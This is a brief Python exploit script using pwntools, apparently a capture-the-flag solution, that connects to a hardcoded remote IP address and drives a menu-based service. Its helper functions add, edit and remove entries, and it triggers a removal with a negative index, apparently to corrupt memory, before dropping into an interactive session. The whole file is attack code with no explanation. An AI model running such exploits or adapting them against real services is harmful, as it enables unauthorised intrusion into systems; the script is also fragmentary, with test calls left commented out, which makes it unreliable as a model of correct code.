from pwn import *

HOST = ""
PORT = 1234
REMOTE = 0
if(REMOTE):
  s = remote(HOST,PORT)
else:
  s = remote('13.125.131.113',PORT)
def add_arg(dat):
  s.recvuntil('5. Let the world die')
  s.sendline('2')
  s.recvuntil(':')
  s.sendline(dat)
def edit(no,dat):
  s.recvuntil('5. Let the world die')
  s.sendline('3')
  s.recvuntil('?')
  s.sendline(str(no))
  s.recvuntil(':')
  s.sendline(dat)
def remove(start,end):
  s.recvuntil('5. Let the world die')
  s.sendline('4')
  s.recvuntil('2. Remove consecutive arguments')
  s.sendline('2')
  s.recvuntil('?')
  s.sendline(str(start))
  s.recvuntil('?')
  s.sendline(str(end))

add_arg("A"*32)
remove(0,-0x7d)
#raw_input()
#remove(8,118)
#remove(0,0x7f)
s.interactive()
